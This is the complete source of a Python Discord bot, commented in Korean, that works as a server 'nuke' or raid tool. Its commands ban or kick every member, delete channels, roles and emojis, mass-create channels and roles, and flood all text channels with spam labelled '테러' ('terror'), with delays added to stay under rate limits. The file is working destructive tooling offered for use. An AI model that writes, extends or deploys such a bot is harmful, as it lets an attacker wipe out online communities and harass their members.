import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
token = os.getenv("DISCORD_TOKEN")

# 봇 설정
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# 시작
@bot.event
async def on_ready():
    print(f"봇 켜짐: {bot.user.name}")
    await bot.change_presence(activity=discord.Game(name="!help"))

@bot.command(name="help", aliases=["명령어"])
async def help_cmd(ctx):
    # 그냥 텍스트로 대충 보냄
    text = """
!ch <이름> <개수> : 채널 생성
!delch <개수> : 채널 삭제
!list : 채널 목록
!talk <내용> : 말하기
!dm <@유저> <내용> : DM 보내기
!clear <개수> : 메시지 청소
!banall : 전체 밴
!kickall : 전체 킥
!prune <일수> : 휴면 유저 추방
!cr <이름> <개수> : 역할 생성
!delr : 역할 삭제
!delemoji : 이모지 삭제
!spam <개수> <내용> : 도배
    """
    await ctx.send(f"```{text}```")

# 채널 생성
@bot.command(name="ch")
@commands.has_permissions(administrator=True)
async def ch(ctx, name: str, count: int = 10):
    if count > 500:
        return await ctx.send("개수 500개 넘으면 봇 팅김")
        
    await ctx.send(f"{count}개 채널 만드는 중...")
    
    # for문으로 순차 생성 (사람이 짠 티)
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i+1}")
        except:
            pass
            
    await ctx.send("채널 생성 끝")

# 채널 삭제
@bot.command(name="delch")
@commands.has_permissions(administrator=True)
async def delch(ctx, count: int = 10):
    chs = ctx.guild.channels
    if len(chs) == 0:
        return await ctx.send("삭제할 채널 없음")
        
    await ctx.send("채널 삭제 시작")
    deleted = 0
    
    for c in chs:
        if deleted >= count:
            break
        try:
            await c.delete()
            deleted += 1
        except:
            pass
            
    await ctx.send(f"{deleted}개 삭제 완료")

@bot.command(name="list")
async def list_ch(ctx):
    t_ch = [c.name for c in ctx.guild.text_channels]
    v_ch = [c.name for c in ctx.guild.voice_channels]
    await ctx.send(f"텍스트: {', '.join(t_ch)}\n음성: {', '.join(v_ch)}")

# 말하기 & DM
@bot.command(name="talk")
async def talk(ctx, *, msg: str):
    await ctx.message.delete()
    await ctx.send(msg)

@bot.command(name="dm")
@commands.has_permissions(administrator=True)
async def dm(ctx, member: discord.Member, *, msg: str):
    try:
        await member.send(msg)
        await ctx.send("DM 보냄")
    except:
        await ctx.send("DM 못 보냄 (차단했거나 에러)")

# 청소
@bot.command(name="clear", aliases=["청소"])
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount: int = 5):
    if amount > 100:
        amount = 100
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"{amount}개 삭제함", delete_after=3)

# 전체 밴 & 킥 (아까 텍스트 파일 읽는 부분)
@bot.command(name="banall")
@commands.has_permissions(administrator=True)
async def banall(ctx):
    try:
        # 그냥 서버에 있는 놈들 다 밴하게 수정 (파일 읽기 귀찮아서)
        members = ctx.guild.members
        success = 0
        
        for m in members:
            if m.bot or m == ctx.author:
                continue
            try:
                await m.ban(reason="테러")
                success += 1
                await asyncio.sleep(0.5) # 디스코드한테 혼나지 않게 대기
            except:
                pass
                
        await ctx.send(f"{success}명 밴 완료")
    except Exception as e:
        await ctx.send(f"에러: {e}")

@bot.command(name="kickall")
@commands.has_permissions(administrator=True)
async def kickall(ctx):
    members = ctx.guild.members
    success = 0
    for m in members:
        if m.bot or m == ctx.author:
            continue
        try:
            await m.kick(reason="테러")
            success += 1
            await asyncio.sleep(0.5)
        except:
            pass
    await ctx.send(f"{success}명 킥 완료")

# 프룬 (휴면 유저)
@bot.command(name="prune")
@commands.has_permissions(administrator=True)
async def prune(ctx, days: int = 7):
    if days > 30:
        return await ctx.send("30일까지만 가능")
    try:
        p = await ctx.guild.prune_members(days=days)
        await ctx.send(f"{p}명 추방")
    except:
        await ctx.send("프룬 실패 (권한 없거나 에러)")

# 역할 생성 & 삭제
@bot.command(name="cr")
@commands.has_permissions(administrator=True)
async def cr(ctx, name: str, count: int = 10):
    if count > 100:
        count = 100
    await ctx.send("역할 생성 중...")
    for i in range(count):
        try:
            # 랜덤 색상 그냥 대충 넣음
            color = discord.Color.random()
            await ctx.guild.create_role(name=name, color=color)
        except:
            pass
    await ctx.send("역할 생성 완료")

@bot.command(name="delr")
@commands.has_permissions(administrator=True)
async def delr(ctx):
    roles = ctx.guild.roles
    deleted = 0
    for r in roles:
        # @everyone이랑 봇보다 높은 역할은 못 지움
        if r == ctx.guild.default_role or r >= ctx.guild.me.top_role:
            continue
        try:
            await r.delete()
            deleted += 1
        except:
            pass
    await ctx.send(f"{deleted}개 역할 삭제함")

# 이모지 삭제
@bot.command(name="delemoji")
@commands.has_permissions(administrator=True)
async def delemoji(ctx):
    emojis = ctx.guild.emojis
    cnt = 0
    for e in emojis:
        try:
            await e.delete()
            cnt += 1
        except:
            pass
    await ctx.send(f"{cnt}개 이모지 삭제함")

# 도배 (스팸)
@bot.command(name="spam")
@commands.has_permissions(administrator=True)
async def spam(ctx, count: int = 10, *, msg: str = "테러"):
    if count > 1000:
        count = 1000
        
    chans = ctx.guild.text_channels
    if not chans:
        return await ctx.send("채널이 없음")
        
    await ctx.send("스팸 시작")
    
    for i in range(count):
        try:
            # 채널 돌아가면서 스팸 날리기
            target = chans[i % len(chans)]
            await target.send(msg)
        except:
            pass
            
    await ctx.send("스팸 완료", delete_after=3)

# 에러 처리
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("너 관리자 아니잖아 ㅋ")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("명령어 똑바로 입력해라 (!help 쳐봐)")

bot.run(token)
